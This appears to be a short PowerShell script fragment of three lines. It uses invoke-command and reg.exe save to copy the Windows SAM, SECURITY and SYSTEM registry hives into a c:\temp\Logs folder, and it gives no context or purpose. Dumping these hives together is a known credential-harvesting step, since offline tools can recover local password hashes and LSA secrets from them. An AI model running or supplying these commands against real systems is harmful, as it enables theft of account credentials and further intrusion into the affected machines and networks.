
invoke-command -ScriptBlock{ reg.exe save HKLM\SAM c:\temp\Logs\sam.hiv }
invoke-command -ScriptBlock{ reg.exe save HKLM\SECURITY c:\temp\Logs\security.hiv }
invoke-command -ScriptBlock{ reg.exe save HKLM\SYSTEM c:\temp\Logs\system.hiv }
